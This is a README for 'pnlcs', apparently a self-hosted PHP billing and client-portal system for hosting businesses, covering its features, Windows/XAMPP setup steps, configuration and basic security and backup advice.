# 🧾 pnlcs - Simple billing software for hosting businesses

<a href="https://github.com/Hydrodamalishassle177/pnlcs/releases">
  <img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download pnlcs">
</a>

pnlcs manages hosting billing and customer portals. It offers tools for invoicing, domain management, and ticket support. The software targets small and medium hosting providers. It runs on a self-hosted platform. It manages client accounts through a web interface. You can localize the system using thirty available languages. The design supports fifteen themes. 

## 🛠️ Features

*   **Billing and Invoicing:** Create, send, and track client invoices.
*   **Domain Management:** Register and track domains for your clients.
*   **SSL Tracking:** Monitor certificate status for client accounts.
*   **Support Tickets:** Communicate with users through a built-in help desk.
*   **Reseller Support:** Manage tiers for distributors.
*   **Theme Options:** Choose from fifteen different user interface styles.
*   **Multi-language:** Support users in thirty different regions.

## ⚙️ System Requirements

To run pnlcs on your Windows machine, ensure your system meets these standards:

*   **Operating System:** Windows 10 or 11.
*   **Memory:** At least 4GB of RAM. 8GB is recommended for smooth operation.
*   **Storage:** 500MB of free disk space for the initial installation.
*   **Web Server:** You need a local server environment. Use tools like XAMPP or Laragon to manage PHP and MySQL requirements.
*   **PHP Version:** 8.2 or higher.
*   **Database:** MySQL 8.0 or MariaDB 10.6 or higher.

## 📥 How to Install

Follow these steps to set up pnlcs on your computer:

1. Visit the [releases page](https://github.com/Hydrodamalishassle177/pnlcs/releases) to download the latest version of the application.
2. Select the compressed archive file.
3. Extract the contents of the archive to your web server folder (usually `C:\xampp\htdocs\pnlcs` if using XAMPP).
4. Launch your server control panel. Start Apache and MySQL services.
5. Create a new empty database in your MySQL environment using tools like phpMyAdmin.
6. Open your web browser and navigate to the local folder where you placed the files (e.g., `http://localhost/pnlcs`).
7. Follow the web-based setup wizard.
8. Enter your database connection details when prompted.
9. Complete the administrative account creation.

## 🔐 Configuration

After the initial setup, configure these settings to match your business needs:

*   **Business Details:** Enter your company name, address, and tax identification numbers under Settings.
*   **Email Setup:** Connect your SMTP server to send invoices and ticket alerts to clients.
*   **Payment Gateways:** Attach your preferred payment service providers to accept money from users.
*   **Localization:** Visit the language settings to select your default interface language from the list of thirty options.
*   **Theming:** Navigate to the themes menu to pick a visual style that matches your brand.

## 📌 Usage

The dashboard provides a view of your hosting business. Use the main menu to perform these actions:

*   **Invoicing:** View pending, paid, and overdue invoices. You can generate PDFs for clients through the system.
*   **Client Management:** Add new customers or modify existing contact information. Each client gets their own portal access.
*   **Ticket System:** Check open support requests. Assign tickets to staff members or close them after resolution.
*   **Hosting Stats:** View domain expiration dates and SSL status for all active accounts.

## 🧩 Modifying the Interface

You can change how the software looks through the theme selector. Choose one of the fifteen themes to adjust the colors and layout. Changes take effect immediately once you save the settings. The system uses Tailwind CSS, which ensures a clean look across all devices.

## 🛡️ Support and Updates

The software is free and released under the MIT license. This means you have the right to use, modify, and distribute the code. For bug reports or feature requests, use the GitHub issue tracker linked to the repository. Please search existing issues before you create a new one to avoid duplicates.

## 🏢 Scaling Your Business

As your client base grows, you can adjust the capacity of your server. pnlcs is designed to run efficiently on standard hosting infrastructure. If you notice a slowdown, upgrade your RAM or move the database to a dedicated server. This keeps the portal responsive for your users.

Regular database backups protect your business data. Set up a schedule through your hosting control panel to export your MySQL database daily. Store these backups in a separate location to prevent data loss.

Localization allows you to serve customers in different countries. If a language is missing, you can add new translation files to the system directory. The setup recognizes new files automatically after a server refresh.

The software tracks reseller groups separately. You can assign specific pricing tiers to these groups. This allows you to offer discounts to your partners without manually adjusting individual invoices.

Security is important when handling billing data. Always keep your local server updated with the latest patches. Use strong passwords for the administrative account. Change the default login URL if you want a layer of extra protection against unauthorized access.